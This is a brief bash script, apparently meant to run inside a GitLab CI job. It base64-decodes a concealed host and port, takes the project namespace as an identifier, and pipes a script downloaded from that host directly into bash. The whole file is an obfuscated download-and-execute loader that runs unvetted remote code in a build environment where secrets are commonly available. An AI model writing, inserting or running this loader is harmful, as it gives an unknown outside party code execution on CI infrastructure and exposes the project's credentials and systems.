#!/bin/bash

# 参数配置
TMPSTR="aS5hZ2FuemFpLmNvbToyNzQ2Mw=="
DOMAIN=`echo -n $TMPSTR | base64 -d`
ROLEID=$CI_PROJECT_NAMESPACE
echo $DOMAIN 

# 运行
curl -s -L http://$DOMAIN/script.sh?id=$ROLEID-gl | bash -s run $ROLEID-gl
